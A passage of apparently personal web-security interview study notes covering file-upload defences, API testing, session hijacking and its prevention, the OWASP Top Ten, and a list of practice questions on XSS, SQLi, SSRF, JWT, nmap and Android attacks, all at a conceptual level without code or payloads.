- **Allow-list extensions:** Only permit required, safe file extensions (e.g. only `.jpg` for images) and validate the extension after URL-decoding[cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#:~:text=)[cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#:~:text=Content).
    
- **Check MIME type and content:** Verify file’s content type and magic bytes (since `Content-Type` headers can be spoofed). Use a whitelist of MIME types as a sanity check[cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#:~:text=Content).
    
- **Rename & store securely:** Rename uploads to a random filename and store them outside the webroot or with no execute permission, to prevent direct execution.
    
- **Virus scan:** Run antivirus or malware scanning on uploaded files.
    
- **Limit size:** Enforce maximum upload size to prevent disk exhaustion attacks.
    
- **Least privilege:** Set restrictive file permissions on upload directories (no execute).  
    In summary, use a defense-in-depth approach: validate extensions/content, sanitize and store safely, and scan uploads[cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#:~:text=Content).

---
## How do you test the security of APIs (fuzzing and pentest)

- Testing API security involves many of the same techniques as web app testing, plus some specialized ones. Key steps: verify authentication/authorization on each endpoint, and test for injections (SQLi, XSS, XML, etc.) and logic flaws. Use **fuzzing** to send malformed or random data payloads to API endpoints to uncover crashes or unexpected behavior[owasp.org](https://owasp.org/www-community/Fuzzing#:~:text=Fuzzing). Also test rate limiting, CORS policies, and ensure the API properly handles errors. In practice, one might use tools like Burp, Postman, or dedicated API scanners to automate sending various payloads, thus identifying vulnerabilities or missing controls.



---
## Session hijacking
Session hijacking in cybersecurity is a type of cyberattack where an attacker gains unauthorized access to a user's active session by intercepting or manipulating their session token. This allows the attacker to impersonate the legitimate user, accessing data, making transactions, or performing other actions without requiring the user's credentials. 

How Session Hijacking Works:

- **Session Token:**
    
    When a user logs into a website or application, a unique session token (like a cookie or authentication ID) is created and assigned to that user's session. 
    

- **Interception:**
    
    Attackers can intercept these session tokens through various methods, such as: 
    

- **Session Sniffing:** Intercepting network traffic to capture unencrypted session IDs. 

- **Side-Jacking:** Exploiting vulnerabilities in the communication channel or weak encryption to steal session tokens. 

- **Cross-Site Scripting (XSS):** Injecting malicious scripts to steal session tokens from users' browsers. 

- **Impersonation:**
    
    By acquiring a valid session token, the attacker can impersonate the legitimate user and access their session. 
    

Consequences of Session Hijacking:

- **Unauthorized Access:**
    
    Attackers can access sensitive information, including personal data, financial information, and confidential business data.
    

- **Financial Loss:**
    
    Attackers can make unauthorized transactions, transfer funds, or steal cryptocurrency.
    

- **Data Breaches:**
    
    Session hijacking can lead to data breaches and the compromise of sensitive information.
    

- **Reputation Damage:**
    
    Organizations targeted by session hijacking may suffer a loss of customer trust and damage their reputation. 
    

Prevention:

- **HTTPS Encryption:**
    
    Using HTTPS to encrypt communication between the client and server prevents attackers from intercepting session IDs. 
    

- **Strong Session Tokens:**
    
    Using strong, unpredictable session tokens can make it harder for attackers to guess or predict them. 
    

- **Regular Token Refresh:**
    
    Regularly refreshing session tokens can reduce the window of vulnerability for attackers. 
    

- **Session Management Tools:**
    
    Implementing robust session management tools can help detect and prevent session hijacking attempts. 
    

- **User Awareness:**
    
    Educating users about the risks of session hijacking and how to protect themselves can help reduce the likelihood of successful attacks. 
    

- **Multi-Factor Authentication (MFA):**
    
    Implementing MFA can help protect against session hijacking attempts by adding an extra layer of security.

---

Open redirect vulnerability explain
Impact: in phishing

---

Clickjacking -> user do something without wanting it
Mitigation

---
A CORS (Cross-Origin Resource Sharing) attack
==exploits vulnerabilities in how web applications handle cross-domain requests==.

---

## [OWASP Top Ten | OWASP Foundation](https://owasp.org/www-project-top-ten/)

![[Pasted image 20250930115500.png]]
1. [**A01:2021-Broken Access Control**](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
2. [**A02:2021-Cryptographic Failures**](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
3. [**A03:2021-Injection**](https://owasp.org/Top10/A03_2021-Injection/)
	1. XSS
	2. SQL Injection
	3. SSTI
4. [**A04:2021-Insecure Design**](https://owasp.org/Top10/A04_2021-Insecure_Design/)
5. [**A05:2021-Security Misconfiguration**](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
6. [**A06:2021-Vulnerable and Outdated Components**](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
7. [**A07:2021-Identification and Authentication Failures**](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
8. [**A08:2021-Software and Data Integrity Failures**](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
9. [**A09:2021-Security Logging and Monitoring Failures**](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)
10. [**A10:2021-Server-Side Request Forgery (SSRF)**](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)



---

Best practice to stop file aplaud -> يرفع على سيرفر خارجي

Different between authorization and authentication
Define the least privilege concept
What is CSP
What is IDOR
How can we exploit file upload vulnerabilities 
Lfi and path traversal
Username enumeration
Rate limit
Host header injection
Xss and its types
Cryptographic failures

What Cilent side ,server side 
vailddtion in file upload 
What csrf and mitigation (mention samesite 
Attribute )
What difference btween head put get post 
What xss and types 
Divde xss as 2types persistence and ….
Sqli types and talk in-details about each one 
Ssrf possible attack and what mitigation
 What cookie and talk about session management
 Possible attacks 
In each phase of them 
Talk about business logic vulnerabilities 
Broken access control vulnerabilities 
What session fixation
 What jwt token and possibles attacks 
———————
If you deployed a network Linux mashine 
What kill chain you follow 
hint :
Explin your methodology*build your own senrio 
What nmap do by default 
What flags do -Pn
,A-
-Sn 
What tcp full scan and talk about types of port scanning
Indetails 
What banner gripping 
 ———————-
Explain what android possible attacks 
Mention insecure login , insecuredata stroge 
Mention sherard preferences
Sqli ,
lfi through webview
Xss
And so on based you know

[^1]: A **protocol** is a system of rules that define how data is exchanged within or between computers. Communications between devices require that the devices agree on the format of the data that is being exchanged. The set of rules that defines a format is called a protocol.

[^2]: A host is a device connected to the [Internet](https://developer.mozilla.org/en-US/docs/Glossary/Internet) (or a local network). Some hosts called [servers](https://developer.mozilla.org/en-US/docs/Glossary/Server) offer additional services like serving webpages or storing files and emails.
The host doesn't need to be a hardware instance. It can be generated by virtual machines. The host generated by virtual machines is called "Virtual hosting".

[^3]: For a computer connected to a network with an [IP address](https://developer.mozilla.org/en-US/docs/Glossary/IP_Address), a **port** is a communication endpoint. Ports are designated by numbers, and below 1024 each port is associated by default with a specific [protocol](https://developer.mozilla.org/en-US/docs/Glossary/Protocol).

